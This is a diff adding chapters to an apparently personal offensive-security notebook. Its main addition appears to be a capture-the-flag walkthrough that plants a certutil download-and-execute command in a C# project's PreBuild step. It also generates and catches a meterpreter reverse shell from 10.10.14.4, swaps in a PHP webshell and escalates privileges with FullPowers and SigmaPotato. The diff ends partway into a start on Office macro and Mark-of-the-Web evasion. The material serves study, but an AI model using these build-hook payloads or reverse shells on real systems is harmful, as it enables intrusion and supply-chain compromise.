@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html"><strong aria-hidden="true">3.</strong> Tome two, Powershell Hexing</a></li><li class="chapter-item expanded "><a href="Tome3.html"><strong aria-hidden="true">4.</strong> Tome three, Embedded magic</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html"><strong aria-hidden="true">3.</strong> Tome two, Powershell Hexing</a></li><li class="chapter-item expanded "><a href="Tome3.html"><strong aria-hidden="true">4.</strong> Tome three, Embedded magic</a></li><li class="chapter-item expanded "><a href="Tome2.html"><strong aria-hidden="true">5.</strong> Tome Four, Git with vengeance</a></li><li class="chapter-item expanded "><a href="Tome4.html"><strong aria-hidden="true">6.</strong> Tome Five, A Wizards Jade</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -155,7 +155,12 @@
 <tr><td>PURPLE</td><td>RED &amp; BLUE Focus</td></tr>
 <tr><td>BLACK</td><td>Forbidden Wizard Magics</td></tr>
 </tbody></table>
-</div><div style="break-before: page; page-break-before: always;"></div><h1 id="the-first-tome-trolling-via-terminal"><a class="header" href="#the-first-tome-trolling-via-terminal">The First Tome, Trolling via Terminal</a></h1>
+</div>
+<p>Well updates abound but where to start</p>
+<ul>
+<li>Feb 09 2024 A wizards life can sure take some turns. The mages judiciary has been making this wizards life hell. I am forbidden from casting my type of spells until they finish there magical investigation... Which is taking forever, But to quite another wise mage &quot;This too shall pass&quot; However, it has been a great time to just mess around casting some apprentice incantations and improve my ability in other forms of casting. Soon I shall master Win32API, and I hope to get my OSCE^3. Another badge to add to my Casting Certifications. </li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="the-first-tome-trolling-via-terminal"><a class="header" href="#the-first-tome-trolling-via-terminal">The First Tome, Trolling via Terminal</a></h1>
 <p>Spell Class : Red Magic</p>
 <p>Spell Level : Introduction</p>
 <h2 id="ascii-web"><a class="header" href="#ascii-web">ASCII-WEB</a></h2>
@@ -337,6 +342,70 @@ Set-StrictMode -Version 2
 <h3 id="arduino-the-savior-for-beginning"><a class="header" href="#arduino-the-savior-for-beginning">Arduino the savior for beginning</a></h3>
 <p>Moving into the space of we understand our chip and our interface tool. We can now begin to attempt and pass instructions to this chip which should relay that to the ESP8266 in my situation. </p>
 <p><code>yay arduino</code> was all it took for me to install Arduino, if you are not using pacman or yay please find your own solution to this issue. </p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="git-with-vengeance"><a class="header" href="#git-with-vengeance">Git with vengeance</a></h1>
+<p>Build a solution from Visual Studio code. C# project will do. </p>
+<p>Right click on the project and go to the build section.</p>
+<p>Load a payload into the pre-compile actions.
+Which can be found in the picture below. This is located at <code>*.csproj</code>
+<img src="attachments/Pastedimage20231005201455.png" alt="Payload" /></p>
+<p>Utilizing the PreBuild tag, the Exec command = PAYLOAD</p>
+<hr />
+<p>First attempt failed, Reverse shell in the Prebuild is crashing or having some kind of issue. </p>
+<p>Need to change from powershell reverse shell into a MSFpayload with metasploit</p>
+<p><img src="attachments/Pasted%20image%2020231005211129.png" alt="Reverseshell" />
+Build failed (Sad Trombone)
+But what did work was getting wells correct .sln file.</p>
+<pre><code class="language-pre">  &lt;Target Name=&quot;PreBuild&quot; BeforeTargets=&quot;PreBuildEvent&quot;&gt;
+    &lt;Exec Command=&quot;certutil -f -urlcache http://10.10.14.4:6969/plz.exe c:\users\public\plz.exe&amp;#xD;&amp;#xA;c:\users\public\plz.exe&quot; /&gt;
+</code></pre>
+<p>This is how inside the .csproj we get the payload to fire.</p>
+<p>Payload was </p>
+<pre><code class="language-msfvenom">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f exe -o plz.exe
+
+</code></pre>
+<p>Listener was </p>
+<pre><code class="language-msfconsole">sfconsole -q -x &quot;use multi/handler; set payload windows/x64/meterpreter/
+reverse_tcp; set lhost 10.10.14.4; set lport 9001; exploit&quot;
+</code></pre>
+<p><img src="attachments/Pasted%20image%2020231005231302.png" alt="Serverpull" /></p>
+<p>This is the server yanking the files from me and finally executing my staged payload.</p>
+<p>Doing some WinPEAS we can find the service XAMPP hosting the webpage we interact with</p>
+<p>Doing </p>
+<pre><code>C:\ dir /B /S index.php 
+</code></pre>
+<p>We can find the Area for the webpage we have been interacting with</p>
+<p><img src="attachments/Pasted%20image%2020231005231850.png" alt="IMAGE" /></p>
+<p>From here we can replace the submit.php file with a php webshell</p>
+<p>From the some of our shells we can use certutil.exe to bring another staged payload to the box, but host it on another port. </p>
+<p><img src="Pasted%20image%2020231005232038.png" alt="img" /></p>
+<p>From here we can use the webshell we moved onto the box. Browse to the /submit.php </p>
+<p><img src="attachments/Pasted%20image%2020231005232132.png" alt="img" /></p>
+<p>We now have the access level of <img src="attachments/Pasted%20image%2020231005232257.png" alt="img" /></p>
+<p>Nice but not quite what we need. Working with dabois we found FullPower.exe </p>
+<p>https://github.com/itm4n/FullPowers
+On Windows, some services executed as <code>LOCAL SERVICE</code> or <code>NETWORK SERVICE</code> are configured to <strong>run with a restricted set of privileges</strong>. Therefore, even if the service is compromised, <strong>you won't get the golden impersonation privileges</strong> and privilege escalation to <code>LOCAL SYSTEM</code> should be more complicated. However, I found that, when you <strong>create a scheduled task</strong>, the new process created by the <strong>Task Scheduler Service</strong> has <strong>all the default privileges</strong> of the associated user account (except <em>SeImpersonate</em>). Therefore, with some token manipulations, you can spawn a new process with all the missing privileges.</p>
+<p>So once we run that we now have the ability to gain SEimpersonate YIPEEE</p>
+<p>Now using Tylers WICKED updated SIGMA POTATO https://github.com/tylerdotrar/SigmaPotato Which he lovingly built in with a revshell. </p>
+<p>FullPower.exe; SigmaPotato.exe --revshell IP PORT</p>
+<p><img src="attachments/Pasted%20image%2020231005232627.png" alt="img" /></p>
+<p>YEEEEE</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="wizards-jade"><a class="header" href="#wizards-jade">Wizards jade</a></h1>
+<p>Hello apprentices of all ages. Let us take for a minute and thank those that came before. Wizards of Yore left us the ability to cast into all of time our thoughts. What a blessing it is. Anyway poetic waxing out of the way.</p>
+<p>Crafting some payloads for Microsoft Office can take many forms. With the advancements made by Windows we now have the Mark of the Web (MOTW) Here we can see the first line of defense protecting users from the most basic of Phishing, Granted this is only in effect if the Defender of said network have disabled the now DEFAULT setting of alerting users of Windows Macros that do not come from internal emails, domain locations or with certs signed by some internal team. </p>
+<p>This must be disabled as it is now enabled by DEFAULT!!</p>
+<p>Let us deconstruct these incantations,<br />
+<img src="attachments/MOTW.png" alt="Wizard_Render" />
+In the above picture we can see an example of the dreaded ZoneId=3</p>
+<ul>
+<li>ZoneId=0: Local machine.</li>
+<li>ZoneId=1: Local intranet.</li>
+<li>ZoneId=2: Trusted sites.</li>
+<li>ZoneId=3: Internet.</li>
+<li>ZoneId=4: Restricted sites.</li>
+</ul>
+<p>MSDN in its classic Necronomicon like nature will hint but never outright tell us the dang answer. 
+https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537183(v=vs.85)</p>
+<p>But we can see the structure is the same as the methods used for Safe internet browsing. </p>
 
                     </main>
 
